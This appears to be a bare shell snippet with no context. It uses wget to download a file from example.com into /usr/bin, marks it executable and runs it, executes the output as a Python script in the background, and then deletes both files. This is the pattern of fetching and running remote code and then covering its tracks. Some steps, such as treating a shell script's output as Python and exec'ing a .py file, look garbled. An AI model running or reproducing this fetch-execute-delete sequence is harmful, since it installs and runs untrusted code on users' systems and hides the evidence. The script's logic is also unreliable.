wget http://example.com -O /usr/bin/example.sh
cd /usr/bin;chmod +x example.sh
./example.sh >> example_output.py
exec example_output.py || python3 example_output.py &
ps -ajfx | grep example_output.py
rm example.sh
rm example_output.py
exit